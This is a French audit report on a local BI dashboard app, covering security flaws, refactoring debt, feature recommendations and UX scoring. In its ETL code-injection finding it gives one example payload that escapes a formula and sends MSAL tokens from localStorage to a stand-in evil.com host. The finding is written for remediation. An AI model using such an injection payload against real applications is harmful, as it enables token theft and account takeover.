# Rapport d'Audit - DataScope Dashboard

**Application** : DataScope - Plateforme BI & Analyse de Donnees locale
**Date de l'audit** : 2026-02-07
**Stack** : React 18 / TypeScript 5 / Vite 5 / Tailwind 3 / IndexedDB / Cloudflare Pages
**Volume** : ~33 400 lignes TypeScript, 103 fichiers source, 12 pages, 11 contextes, 13 fichiers de tests

---

## Table des matieres

- [Partie 1 - Audit technique](#partie-1---audit-technique)
  - [1. Points forts](#1-points-forts)
  - [2. Problemes restants](#2-problemes-restants)
  - [3. Bilan des corrections](#3-bilan-des-corrections-effectuees)
- [Partie 2 - Recommandations fonctionnelles BI](#partie-2---recommandations-fonctionnelles-bi)
  - [4. Inventaire fonctionnel](#4-inventaire-des-fonctionnalites-existantes)
  - [5. Fonctionnalites a apporter](#5-fonctionnalites-et-ameliorations-a-apporter)
- [Partie 3 - Analyse UX / Design](#partie-3---analyse-ux--design)
  - [6. Design system](#6-design-system)
  - [7. Layout et navigation](#7-layout-et-navigation)
  - [8. Analyse par page](#8-analyse-detaillee-par-page)
  - [9. Patterns UX transversaux](#9-patterns-ux-transversaux)
  - [10. Scoring et recommandations](#10-scoring-et-recommandations-ux)

---

# Partie 1 - Audit technique

## 1. Points forts

### 1.1 Architecture local-first coherente (Fonctionnel)

- Toutes les donnees sont traitees et stockees localement dans IndexedDB (`utils/db.ts`)
- Aucune telemetrie, aucun tracking, aucun appel reseau non sollicite
- Migration automatique de localStorage vers IndexedDB avec nettoyage (`DataContext.tsx:91-111`)
- Compression intelligente des batches en format colonnaire pour economiser l'espace (`utils/common.ts`)
- L'integration O365 (OneDrive) est strictement optionnelle, initiee par l'utilisateur, authentifiee via OAuth 2.0 + PKCE

### 1.2 Moteur de formules securise (Technique / Securite)

- Le parseur de formules (`utils/formulaEngine.ts`, 352 lignes) est un tokenizer/evaluateur custom
- Aucun usage de `eval()` ou `Function()` dans le moteur de formules (explicitement documente ligne 316)
- Whitelist de 30+ fonctions supportees FR/EN (IF, SUM, AVERAGE, CONCAT, etc.)
- Cache de tokens pour performances
- Gestion d'erreurs gracieuse avec retour `null` en cas d'erreur de syntaxe

### 1.3 Typage TypeScript robuste (Technique)

- Mode `strict: true` active dans tsconfig
- 8 fichiers de types bien organises par domaine (`types/common.ts`, `dataset.ts`, `dashboard.ts`, `pivot.ts`, `finance.ts`, `etl.ts`, `app.ts`, `o365.ts`)
- Types unions discrimines pour les variants (`WidgetType`, `ChartType`, `ViewMode`)
- Seulement 2 usages de `useState<any>` dans tout le projet

### 1.4 Build et securite web (Technique / Securite)

- **Tailwind en build-time** via PostCSS (`tailwind.config.js` + `postcss.config.js` + `index.css`) - plus de CDN runtime
- **CSP implementee** (`index.html:7`) avec restrictions sur `default-src`, `font-src`, `img-src`, `connect-src`
- **Plus d'import maps ni de CDN** : toutes les dependances sont bundlees par Vite
- **Plus de conflit de versions React** : seul React 18.2.0 est utilise

### 1.5 Architecture modulaire (Technique)

- **`utils.ts` decompose** en 7 modules specialises (8 lignes de re-exports) :
  - `utils/db.ts` (144 lignes) - IndexedDB engine
  - `utils/formulaEngine.ts` (352 lignes) - Parseur de formules
  - `utils/csvParser.ts` (166 lignes) - Parsing CSV/TSV
  - `utils/exportUtils.ts` (497 lignes) - Export PDF/HTML/PNG avec imports dynamiques
  - `utils/common.ts` (535 lignes) - Utilitaires partages
  - `utils/mathUtils.ts` (21 lignes) - Regression lineaire
  - `utils/dataGeneration.ts` (222 lignes) - Donnees de demo
  - `utils/diagnostics.ts` (53 lignes) - Suite de diagnostics
- **`PivotTable.tsx` decompose** : page reduite a 200 lignes, logique extraite dans `hooks/usePivotLogic.ts` (842 lignes) et `PivotOverlays.tsx` (46 lignes)

### 1.6 Error Boundary et code splitting (Technique)

- **Error Boundary** (`components/ErrorBoundary.tsx`, 89 lignes) : UI soignee avec affichage de l'erreur, boutons "Reessayer" et "Retour a l'accueil", message rassurant sur la preservation des donnees
- **Code splitting** : 12 pages chargees via `React.lazy()` (`App.tsx:8-19`) avec `<Suspense fallback={<LoadingPage />}>`
- **Imports dynamiques** : jsPDF et html2canvas charges a la demande (`exportUtils.ts:26-29`), pas dans le bundle principal

### 1.7 Performances (Technique)

- Virtualisation des tableaux pivot via `@tanstack/react-virtual` (`PivotGrid.tsx`)
- Memoisation extensive : `useMemo`, `React.memo` sur WidgetCard, `useCallback` dans 7 fichiers (64 occurrences)
- Debounce des calculs pivot (150ms) et sauvegarde IndexedDB differee
- Identifiants generes via `crypto.randomUUID()` (`utils/common.ts:6-8`)

### 1.8 Design system themable (UX)

- Tokens CSS complets dans `index.css` via `@layer base` : 9 palettes, dark mode, 3 styles visuels (defaut, material, glass)
- Configuration Tailwind externalisee dans `tailwind.config.js` (74 lignes) avec `darkMode: 'class'`
- Composants UI reutilisables : Button (5 variants, 4 tailles), Modal (ARIA complet), Tabs (navigation clavier), Badge, MultiSelect

### 1.9 Richesse fonctionnelle (Fonctionnel)

- Import multi-format (CSV, Excel, TSV, copier-coller) avec detection encodage et separateur
- Tableaux croises dynamiques avec drill-down et comparaison temporelle
- Dashboard personnalisable avec widgets configurables (KPI, Chart, List, Text, Report)
- Module budget avec versioning, workflow de validation et templates
- Module forecast avec 5 methodes de prevision et reconciliation
- Pipeline ETL avec 18 transformations et editeur visuel
- Export multi-format (Excel, PDF, HTML interactif, PNG, CSV)
- 15 types de graphiques supportes

---

## 2. Problemes restants

### 2.1 [SECURITE - CRITIQUE] Injection de code via `new Function()` dans l'ETL

**Fichier** : `utils/transformations.ts:384`

```typescript
const result = Function('"use strict"; return (' + expression + ')')();
```

Le module ETL utilise le constructeur `Function()` pour evaluer les formules de colonnes calculees. L'expression est construite en remplacant `[ColName]` par les valeurs des lignes (ligne 375-381), mais aucune sanitization n'est appliquee sur le reste de la formule.

**Contraste** : Le moteur de formules principal (`formulaEngine.ts`) utilise un parseur securise sans `eval`/`Function`. Ce module ETL devrait utiliser le meme parseur.

**Risque** : Un backup forge contenant une formule ETL malveillante (ex: `[ColA] + 1); fetch('https://evil.com', {method:'POST', body: localStorage.getItem('msal')}) //(`) pourrait executer du code arbitraire lors de l'execution du pipeline.

**Recommandation** : Remplacer `Function()` par le `FormulaParser` de `formulaEngine.ts`, ou a defaut valider l'expression avec une whitelist de caracteres autorises (chiffres, operateurs, parentheses).

### 2.2 [SECURITE - MOYENNE] CSP avec `unsafe-inline` dans `script-src`

**Fichier** : `index.html:7`

La CSP actuelle contient `script-src 'self' 'unsafe-inline'`. Le `unsafe-inline` est necessaire pour les scripts inline Vite en mode dev, mais il affaiblit significativement la protection contre les XSS. Combine avec la vulnerabilite `Function()` ci-dessus, un attaquant pourrait exploiter les deux.

**Recommandation** : Pour la production, utiliser un nonce CSP genere par le serveur ou le plugin `vite-plugin-csp` pour eliminer `unsafe-inline`. Cloudflare Pages supporte les headers dynamiques via `_headers` avec nonce.

### 2.3 [SECURITE - MOYENNE] Validation de companyLogo incomplete

**Fichier** : `DataContext.tsx:837`

```typescript
if (shouldImport('companyLogo') && parsed.companyLogo) setCompanyLogo(parsed.companyLogo);
```

Lors de la restauration d'un backup, `companyLogo` est importe sans verification de protocole. Une validation existe en aval dans `exportUtils.ts:85` (`safeLogo` verifie `data:image/` ou `blob:`), mais pas a l'entree dans le state.

**Recommandation** : Ajouter la validation de protocole dans `importBackup` avant `setCompanyLogo`, pour bloquer les URIs malveillantes a la source.

### 2.4 [SECURITE - BASSE] Tokens MSAL en localStorage

**Fichier** : `services/o365Service.ts:46`

```typescript
cacheLocation: BrowserCacheLocation.LocalStorage,
```

Le localStorage est accessible a tout script JavaScript executant dans la meme origine. Le risque est attenue par la CSP et l'absence de XSS identifie (hors le point 2.1).

**Recommandation** : Migrer vers `BrowserCacheLocation.SessionStorage` pour limiter la persistance des tokens.

### 2.5 [TECHNIQUE - HAUTE] 6 fichiers > 1000 lignes non refactorises

| Fichier | Lignes | useState |
|---------|--------|---------|
| `pages/Budget.tsx` | 2 296 | 31 |
| `pages/AnalysisStudio.tsx` | 1 872 | 30 |
| `components/pivot/ChartModal.tsx` | 1 593 | - |
| `pages/DataExplorer.tsx` | 1 575 | 27 |
| `pages/Settings.tsx` | 1 464 | 23 |
| `pages/Forecast.tsx` | 1 125 | 11 |

Les 3 premieres pages cumulent **88 `useState`** dans des composants monolithiques. Cela provoque des re-rendus excessifs et rend la maintenance tres difficile.

**Recommandation** :
- Appliquer le meme pattern que PivotTable : extraire la logique dans des hooks custom (`useBudgetEditor`, `useAnalysisStudio`, etc.)
- Grouper les states lies dans des `useReducer` thematiques
- Decomposer les pages en sous-composants (ex: `BudgetEditor`, `BudgetComparison`, `BudgetWorkflow`)

### 2.6 [TECHNIQUE - HAUTE] 279 occurrences de `: any`

Les fichiers les plus affectes :
- `pages/AnalysisStudio.tsx` : 35 occurrences
- `components/pivot/ChartModal.tsx` : 23
- `components/pivot/PivotGrid.tsx` : 20
- `pages/DataExplorer.tsx` : 9

**Recommandation** : Activer `@typescript-eslint/no-explicit-any` et remplacer progressivement par des types explicites ou `unknown` avec type guards.

### 2.7 [TECHNIQUE - MOYENNE] Absence d'outillage qualite

- Pas de configuration ESLint, Prettier, ou StyleLint
- Pas de pipeline CI/CD (`.github/workflows/` absent)
- Deploiement uniquement manuel (`wrangler pages deploy dist`)

**Recommandation** : Ajouter ESLint + Prettier + un workflow GitHub Actions minimal (`tsc --noEmit` + `vitest run` + `eslint .` + build).

### 2.8 [TECHNIQUE - MOYENNE] Couverture de tests limitee

13 fichiers de tests couvrant la logique metier (pivot, transformations, formules, utils). Manques :
- Aucun test d'integration des pages (Budget, PivotTable, Dashboard)
- 1 seul test composant UI (`Button.test.tsx`)
- Aucun test des 11 contextes/providers
- Aucun test du service O365
- Aucun test E2E

**Recommandation** : Prioriser les tests d'integration des workflows critiques (import, pivot, export) et des contextes.

### 2.9 [FONCTIONNEL - BASSE] Internationalisation en dur

Toutes les chaines sont en francais codees en dur. Non bloquant si le public est francophone, mais limitant pour une ouverture future.

### 2.10 [UX - BASSE] Accessibilite incomplete

- Pas de `aria-live` pour les notifications
- Pas de `skip-to-content` link
- Pas de `prefers-reduced-motion` (animations non desactivables)
- Drag-and-drop inaccessible au clavier

### 2.11 [UX - BASSE] Pas de Service Worker / PWA

L'application necessite un acces reseau pour charger les assets (mais plus pour les CDN). Un Service Worker permettrait un fonctionnement hors-ligne complet.

---

## 3. Bilan des corrections effectuees

Un recapitulatif de tous les points identifies initialement et de leur statut actuel :

| # | Point initial | Priorite | Statut | Preuve |
|---|---------------|----------|--------|--------|
| 3.1 | CDN runtime + conflit React 18/19 | Critique | TRAITE | `index.html` : plus de CDN, `tailwind.config.js` + `postcss.config.js` + `index.css` |
| 3.2 | Absence de CSP | Critique | TRAITE | `index.html:7` : meta CSP presente (reste `unsafe-inline`, cf. 2.2) |
| 4.1 | Fichiers > 1000 lignes | Haute | PARTIEL | `utils.ts` decompose (2037 → 8 lignes), `PivotTable.tsx` decompose (992 → 200 lignes). 6 fichiers > 1000 lignes restants |
| 4.2 | Pas d'Error Boundaries | Haute | TRAITE | `ErrorBoundary.tsx` (89 lignes), wrappee dans `App.tsx:33` |
| 4.3 | Pas de code splitting | Haute | TRAITE | 12 `React.lazy()` dans `App.tsx:8-19` + `<Suspense>` |
| 4.4 | Validation companyLogo | Haute | PARTIEL | Validation en sortie (`exportUtils.ts:85`), mais pas a l'entree (`DataContext.tsx:837`) |
| 5.1 | ESLint / Prettier | Moyenne | NON TRAITE | Aucun fichier de config |
| 5.2 | 279 usages de `any` | Moyenne | NON TRAITE | 279 occurrences dans 20+ fichiers |
| 5.3 | Tests limites | Moyenne | NON TRAITE | 13 fichiers de tests, lacunes majeures |
| 5.4 | CI/CD | Moyenne | NON TRAITE | Pas de `.github/workflows/` |
| 5.5 | i18n en dur | Moyenne | NON TRAITE | Aucun framework i18n |
| 5.6 | Tokens MSAL localStorage | Moyenne | NON TRAITE | `o365Service.ts:46` |
| 6.1 | Service Worker / PWA | Basse | NON TRAITE | Aucune configuration PWA |
| 6.2 | `generateId` Math.random() | Basse | TRAITE | `utils/common.ts:6-8` : `crypto.randomUUID()` |
| 6.3 | Accessibilite | Basse | NON TRAITE | Pas d'`aria-live`, `skip-link` |
| 6.4 | Imports statiques jsPDF | Basse | TRAITE | `exportUtils.ts:26-29` : imports dynamiques |
| 6.5 | Config Tailwind inline | Basse | TRAITE | `tailwind.config.js` (74 lignes) + `index.css` (184 lignes) |

**Score : 7 traites, 2 partiels, 8 non traites, 1 nouveau critique** (`Function()` dans ETL)

---

# Partie 2 - Recommandations fonctionnelles BI

## 4. Inventaire des fonctionnalites existantes

| Module | Maturite | Points cles |
|--------|----------|-------------|
| Pivot Table | Avancee | Multi-sources, drill-down, 6 agregations, comparaison temporelle, conditional formatting, 15 types graphiques |
| Dashboard | Avancee | 5 types widgets (KPI 3 styles, Chart 15 types, List, Text, Report), filtres globaux, export multi-format |
| ETL Pipeline | Avancee | 18 transformations, editeur visuel nodes+connexions, preview live |
| Budget | Tres avancee | Versions, workflow (draft/submitted/validated/rejected/locked), templates, 5 types formules, import/export |
| Forecast | Tres avancee | 5 methodes (manual, copy, driver, ML, trend, seasonal), rolling, reconciliation, MAPE/RMSE |
| Import | Avancee | Excel/CSV/TSV/copier-coller, auto-detection encodage/separateur, mapping intelligent |
| Export | Avancee | PDF, HTML interactif, PNG, CSV/Excel |
| Formules | Avancee | 30+ fonctions FR/EN, parseur securise, cache, 14 actions sequentielles |
| Analysis Studio | Intermediaire | Snapshot/Trend, regression lineaire, sauvegarde/chargement |
| Comparaison temporelle | Intermediaire | Multi-sources, MTD/YTD, delta valeur/pourcentage |
| O365 | POC | Auth OAuth 2.0 + PKCE, backup OneDrive, partage liens |
| Settings | Tres avancee | 25+ parametres, referentiels finance (PCG/IFRS), diagnostics |

### Types de graphiques (15)

bar, column, line, area, pie, donut, radial, radar, treemap, sunburst, funnel, stacked-bar, stacked-column, stacked-area, percent-bar/percent-column

### Agregations

count, sum, avg, min, max, list (pivot) + first, last (ETL)

---

## 5. Fonctionnalites et ameliorations a apporter

### Priorite 1 - Fondamentaux manquants

#### P1.1 - Qualite et profilage des donnees
**Justification** : Un outil BI sans profilage oblige l'utilisateur a decouvrir les problemes de qualite apres coup, dans les graphiques ou pivots. C'est le fondement de toute analyse fiable.

- Profil automatique a l'import : completude par colonne (% nulls), distribution (min/max/moyenne/mediane/ecart-type), cardinalite, detection de patterns (email, telephone, code postal)
- Score de qualite par dataset (completude, coherence, unicite)
- Detection d'outliers (IQR ou Z-score) avec marquage visuel
- Detection de doublons configurable (exact ou fuzzy)
- Regles de validation personnalisables (min/max, regex, foreign keys entre datasets)

**Impact** : Tres eleve | **Effort** : Important

#### P1.2 - Undo/Redo global
**Justification** : L'absence d'annulation freine l'exploration. L'utilisateur hesite a experimenter (supprimer une colonne, modifier une formule) par peur de perdre son etat. Aucun outil BI professionnel ne fonctionne sans undo.

- Stack d'historique (20-50 actions) via Immer.js ou patches
- Raccourcis Ctrl+Z / Ctrl+Y
- Indicateur visuel du nombre d'actions annulables
- Couvrir : modifications de donnees, config pivot, widgets, formules

**Impact** : Tres eleve | **Effort** : Moyen

#### P1.3 - Systeme de notifications et feedback structure
**Justification** : L'application utilise `alert()` natif dans `exportUtils.ts` pour les erreurs. C'est bloquant, non style, et ne permet pas de notification asynchrone.

- Toasts (Sonner ou React Hot Toast) : succes, erreur, warning, info
- Notifications non-bloquantes pour les operations longues (import, export, calcul pivot)
- Confirmation modale stylisee au lieu de `window.confirm()`
- Progress bar pour les operations longues (import gros fichier, export PDF)

**Impact** : Eleve | **Effort** : Faible

#### P1.4 - Audit trail et historique des modifications
**Justification** : Pour un outil budget/forecast, la tracabilite est non-negociable. L'absence d'audit trail rend impossible de savoir quand une valeur budgetaire a ete modifiee.

- Journal des modifications (timestamp, action, valeur avant/apres)
- Historique consultable par dataset, budget, forecast
- Diff visuel entre deux etats
- Possibilite de restaurer un etat anterieur

**Impact** : Eleve | **Effort** : Moyen

---

### Priorite 2 - Enrichissement analytique

#### P2.1 - Scatter plot et graphiques statistiques
**Justification** : L'absence de scatter plot est un trou fonctionnel majeur. C'est le graphique de base pour la correlation, la segmentation, et l'analyse multi-variables.

- Scatter plot (2 axes numeriques + taille de bulle + couleur par categorie)
- Bubble chart (3 dimensions)
- Heatmap / matrice de correlation
- Box plot pour la distribution
- Histogramme (bins automatiques ou manuels)
- Waterfall chart (essentiel pour le module finance)

**Impact** : Eleve | **Effort** : Moyen

#### P2.2 - Drill-through du dashboard vers les donnees
**Justification** : Cliquer sur un KPI ou un segment de graphique pour voir les lignes sous-jacentes est la base de l'exploration BI. Le drill-down existe dans le pivot, mais le passage dashboard vers donnees detaillees est absent.

- Clic sur widget KPI => drawer avec les lignes correspondantes
- Clic sur segment de graphique => filtrage et affichage des lignes
- Navigation dashboard => DataExplorer avec filtres pre-appliques
- Breadcrumb de navigation pour revenir au dashboard

**Impact** : Eleve | **Effort** : Moyen

#### P2.3 - Planification des pipelines ETL
**Justification** : Les pipelines sont executees manuellement. Pour un usage quotidien, il faut pouvoir programmer leur execution.

- Timer configurable par pipeline
- Execution automatique a l'ouverture
- Log d'execution avec succes/echec et duree

**Impact** : Moyen | **Effort** : Moyen

#### P2.4 - Data lineage
**Justification** : Avec les pipelines ETL, jointures, champs calcules et datasets derives, il devient impossible de savoir d'ou vient une donnee.

- Graphe visuel source => transformation => dataset derive => widget
- Clic sur un champ => provenance (source brute, formule, jointure)
- Impact analysis : modifier ce dataset source => quels widgets/budgets affectes ?

**Impact** : Moyen | **Effort** : Important

---

### Priorite 3 - Confort et productivite

#### P3.1 - Command palette (Ctrl+K)
Recherche globale : pages, datasets, analyses sauvegardees, actions rapides. Avec 12 pages et potentiellement des dizaines de datasets, la navigation par sidebar seule est lente.

**Impact** : Moyen | **Effort** : Faible

#### P3.2 - Commentaires et annotations sur les graphiques
Meme en usage individuel, annoter un graphique ("pic du a la campagne Q2") ou un KPI permet de conserver le contexte metier. Annotations positionnees, commentaires par widget, export avec annotations.

**Impact** : Moyen | **Effort** : Moyen

#### P3.3 - Templates de dashboards et d'analyses
Galerie de templates par domaine metier (finance, ventes, RH). Import/export de templates. Templates adaptatifs (detection des champs disponibles).

**Impact** : Moyen | **Effort** : Moyen

#### P3.4 - Export et partage enrichis
Export PDF avec page de garde configurable, pied de page, numerotation. Export PowerPoint. Export planifie. Embed iframe pour integration intranet.

**Impact** : Moyen | **Effort** : Important

---

### Priorite 4 - Intelligence et automatisation

#### P4.1 - Suggestions intelligentes de graphiques
Analyser les donnees (nombre de dimensions/mesures, cardinalite) pour recommander le type de visualisation optimal avec un score de pertinence.

**Impact** : Faible | **Effort** : Moyen

#### P4.2 - ML avance pour le forecasting
Prophet-like decomposition (trend + saisonnalite + jours feries), EMA/WMA, detection automatique de periodicite, cross-validation temporelle, intervalles de confiance.

**Impact** : Faible | **Effort** : Important

---

### Matrice de priorisation fonctionnelle

| # | Fonctionnalite | Impact | Effort | ROI |
|---|----------------|--------|--------|-----|
| P1.3 | Toasts / Notifications | Eleve | Faible | **Tres eleve** |
| P1.2 | Undo/Redo | Tres eleve | Moyen | **Tres eleve** |
| P3.1 | Command palette (Ctrl+K) | Moyen | Faible | **Eleve** |
| P1.1 | Profilage donnees | Tres eleve | Important | Eleve |
| P1.4 | Audit trail | Eleve | Moyen | Eleve |
| P2.1 | Scatter/Heatmap/Waterfall | Eleve | Moyen | Eleve |
| P2.2 | Drill-through dashboard | Eleve | Moyen | Eleve |
| P2.3 | Planification ETL | Moyen | Moyen | Moyen |
| P3.2 | Annotations graphiques | Moyen | Moyen | Moyen |
| P3.3 | Templates dashboards | Moyen | Moyen | Moyen |
| P2.4 | Data lineage | Moyen | Important | Moyen |
| P3.4 | Export enrichi (PPT, planifie) | Moyen | Important | Moyen |
| P4.1 | Suggestions graphiques | Faible | Moyen | Faible |
| P4.2 | ML avance forecasting | Faible | Important | Faible |

---

# Partie 3 - Analyse UX / Design

## 6. Design system

### Points positifs

**Architecture de tokens solide** (`index.css`, `tailwind.config.js`)
- 9 palettes couleur semantiquement nommees (`--brand-50` a `--brand-900`)
- Tokens de surface, texte et statut bien structures
- 3 styles visuels (Default, Material, Glass avec backdrop-filter)
- Configuration Tailwind externalisee, propre, avec `darkMode: 'class'`
- Variables CSS dans `@layer base` (bonne pratique Tailwind)

**Composants UI reutilisables**
- `Button.tsx` : 5 variants (primary, secondary, danger, outline, ghost) + 4 tailles + loading + icon
- `Modal.tsx` : `role="dialog"`, `aria-modal="true"`, `aria-labelledby`, fermeture Escape
- `Tabs.tsx` : Navigation clavier (ArrowLeft/Right, Home/End), `role="tablist"`, `aria-selected`
- `Badge.tsx` : 6 variants coherents avec les status colors
- `MultiSelect.tsx` : Select/Deselect all, detection clic exterieur

### Axes d'amelioration

- **Pas de systeme d'espacement formalise** : `p-6`, `gap-4`, `mt-2` codes en dur au lieu de tokens
- **`Modal.tsx` sans focus trap** : le focus peut s'echapper de la modale (violation WCAG 2.1 AA)
- **`MultiSelect.tsx`** : pas de recherche dans les options, pas de virtualisation (lent avec 100+ items)
- **Pas de `prefers-reduced-motion`** : les animations (blobs glass, transitions) ne sont pas desactivables
- **Quelques couleurs Tailwind hardcodees** (`bg-slate-100`, `text-gray-600`) au lieu des tokens CSS, cassant le dark mode par endroits

---

## 7. Layout et navigation

### Points positifs (`Layout.tsx`, `Sidebar.tsx`)

- Navigation claire en 12 sections avec icones Lucide coherentes
- Sidebar collapsible avec indicateur de stockage en temps reel
- IDs d'onboarding tour sur chaque element de navigation
- Sauvegarde rapide integree dans le footer de la sidebar

### Axes d'amelioration

- **Pas de breadcrumb** : impossible de situer la page courante dans la hierarchie
- **Pas de recherche globale** : navigation exclusivement par menu
- **Mobile confus** : sidebar 12 items en bottom bar, trop encombre ; une bottom navigation a 4-5 items + "Plus" serait preferable
- **Pas de notification de limite disque** proactive a l'approche de la saturation

---

## 8. Analyse detaillee par page

### 8.1 Dashboard

**Points positifs** : Grille responsive (4/2/1 colonnes), mode edition, empty state engageant ("Creer mon premier widget"), fullscreen, filtres globaux, drag & drop.

**Axes d'amelioration** :
- Pas de groupes/sections thematiques pour organiser les widgets
- Pas de refresh automatique des donnees
- Pas d'URL partageable pour un etat specifique du dashboard

### 8.2 Import

**Points positifs** : Workflow 3 etapes (Input => Mapping => Confirm), drag & drop avec feedback visuel, selecteur d'encodage, auto-mapping intelligent, apprentissage des mappings.

**Axes d'amelioration** :
- Validation tardive (erreurs a la confirmation, apres le mapping)
- Pas de preview avant/apres pour les transformations de nettoyage
- Pas de detection de doublons a l'import
- Pas de barre de progression pour les gros fichiers

### 8.3 Pivot Table

**Points positifs** : Drag & drop entre 4 zones, virtualisation, comparaison temporelle, conditional formatting, 15 types de graphiques, export multi-format. Le refactoring via `usePivotLogic.ts` a rendu la page lisible (200 lignes).

**Axes d'amelioration** :
- Pas de feedback visuel pendant le drag (zones de depot non mises en surbrillance)
- Pas de mode "calcul differe" (chaque changement recalcule immediatement)
- D&D inaccessible au clavier

### 8.4 Data Explorer

**Points positifs** : Colonnes redimensionnables, edition inline, filtrage par colonne (regex ou exact), VLOOKUP entre datasets, champs calcules, conditional formatting.

**Axes d'amelioration** :
- 27 `useState` dans un composant (1575 lignes) : a refactorer
- Pas de reordonnancement de colonnes
- Pas de grouping avec sous-totaux
- Pas d'export de la vue filtree
- VLOOKUP : UX confuse avec drawers imbriques

### 8.5 Analysis Studio

**Points positifs** : Basculement Snapshot/Trend fluide, modes de couleur (Multi, Single, Gradient), sauvegarde/chargement d'analyses.

**Axes d'amelioration** :
- 30 `useState`, 1872 lignes : a refactorer
- Forecast prevu dans le code (`showForecast`) mais non implemente
- Pas de scatter plot
- Pas de query builder visuel pour les filtres

### 8.6 Budget

**Points positifs** : 6 onglets organises, edition inline, workflow de validation, import/export Excel, axes analytiques.

**Axes d'amelioration** :
- 2296 lignes, 31 `useState` : le plus gros fichier du projet
- Pas de formules dans les cellules (saisie manuelle uniquement)
- Workflow sans UI visible (statuts geres dans le code mais flux non visible)
- Pas d'audit trail
- Pas d'export PDF

### 8.7 Forecast

**Points positifs** : 5 methodes de prevision, rolling forecast, reconciliation avec MAPE/RMSE, drivers.

**Axes d'amelioration** :
- ML basique (tendance lineaire et saisonnalite simple)
- Pas de graphique de reconciliation
- Pas de waterfall chart pour les ecarts budget/realise

### 8.8 ETL Pipeline

**Points positifs** : Editeur visuel avec nodes et connexions, 18 transformations, preview a chaque etape.

**Axes d'amelioration** :
- Canvas non zoomable (sature pour les pipelines complexes)
- Pas de minimap
- Execution manuelle uniquement
- **Vulnerabilite `Function()`** (cf. point 2.1)

### 8.9 Settings

**Points positifs** : Organisation par sections avec recherche, referentiels financiers complets, diagnostics integres, backup/restore avec selection partielle.

**Axes d'amelioration** :
- 1464 lignes : devrait etre decompose en sous-routes
- Restore sans validation du backup
- Diagnostics sans action corrective proposee

---

## 9. Patterns UX transversaux

| Pattern | Implementation actuelle | Qualite |
|---------|------------------------|---------|
| Loading | `<Loader2 className="animate-spin" />` + page de chargement Suspense | Correcte |
| Succes | Messages texte ephemeres | Basique |
| Erreur | `alert()` dans exportUtils (2 occurrences) | Insuffisant |
| Confirmation | Aucune modale de confirmation identifiee | Manquant |
| Progression | Absente pour les operations longues | Manquant |
| Undo | Absent | Manquant |
| Crash recovery | ErrorBoundary avec "Reessayer" + "Accueil" | Bonne |

### Onboarding
- State `hasSeenOnboarding` et `completeOnboarding()` presents dans DataContext
- IDs de tour places sur la navigation (`tour-nav-*`)
- Aucune librairie de tour integree (pas de Shepherd, introjs)
- **Non fonctionnel**

### Raccourcis clavier
- Escape pour fermer les modales
- ArrowLeft/Right pour la navigation dans les tabs
- **Manquants** : Ctrl+S (sauvegarder), Ctrl+Z (undo), Ctrl+K (recherche), Ctrl+E (export)

---

## 10. Scoring et recommandations UX

| Categorie | Score | Justification |
|-----------|-------|---------------|
| Coherence visuelle | 8/10 | Design system solide, tokens bien structures, 3 styles visuels |
| Composants reutilisables | 7/10 | Bonne base mais manques (focus trap, indeterminate, search dans MultiSelect) |
| Architecture front | 6/10 | Code splitting OK, Error Boundary OK, mais 6 fichiers monolithiques restants |
| Accessibilite | 5/10 | ARIA sur Button/Modal/Tabs, mais pas de focus trap, D&D inaccessible, pas de skip-link |
| Performance percue | 6/10 | Virtualisation + lazy loading OK, mais 88 states dans 3 composants = re-renders |
| Responsive mobile | 5/10 | Layout adaptatif mais sidebar 12 items en bottom bar |
| Feedback utilisateur | 4/10 | `alert()` natif, pas de toasts, pas d'undo, pas de progress |
| Decouverte | 4/10 | Onboarding non fonctionnel, pas d'aide contextuelle |
| **Moyenne** | **5.6/10** | |

### Recommandations UX par impact

**Tier 1 - Impact eleve, effort modere**
1. Remplacer `alert()` par des toasts (Sonner) - toutes les pages
2. Focus trap dans `Modal.tsx` - conformite WCAG 2.1 AA
3. Refactoring etat Budget/AnalysisStudio/DataExplorer (comme fait pour PivotTable)
4. Bottom navigation mobile : 5 items + menu "Plus"
5. `prefers-reduced-motion` : desactiver les animations

**Tier 2 - Impact modere**
6. Breadcrumb de navigation contextuel
7. Undo/Redo (Ctrl+Z / Ctrl+Y) avec indicateur visuel
8. Feedback D&D dans le pivot : zones de depot en surbrillance
9. Progress bar pour operations longues (import, export, calcul)
10. Dark mode complet : remplacer les classes Tailwind hardcodees par tokens CSS

**Tier 3 - Nice to have**
11. Command palette (Ctrl+K)
12. Raccourcis clavier documentes
13. Onboarding tour fonctionnel (Shepherd.js)
14. Aide contextuelle (icones info avec tooltips)
15. Skeleton loaders au lieu de spinners

---

## Conclusion

DataScope est une application BI locale remarquablement riche. Le refactoring recent a traite les problemes les plus critiques (CDN, CSP, code splitting, Error Boundary, decomposition de `utils.ts` et `PivotTable.tsx`, `generateId` securise).

**Les 3 chantiers les plus impactants restants** :

1. **Securite ETL** (Critique) : Remplacer `Function()` dans `transformations.ts:384` par le `FormulaParser` existant. C'est une correction ponctuelle a fort impact securitaire.

2. **Refactoring des 6 fichiers monolithiques** (Haute) : Appliquer le pattern PivotTable (hook custom + decomposition en sous-composants) a Budget, AnalysisStudio, DataExplorer, Settings, Forecast et ChartModal. Cela améliorera la maintenabilite, les performances, et la capacite a tester.

3. **Feedback UX** (Haute) : Remplacer les `alert()` par des toasts, ajouter l'undo/redo, et implementer le profilage de donnees. Ce sont les fonctionnalites qui transforment un outil technique en produit utilisable au quotidien.
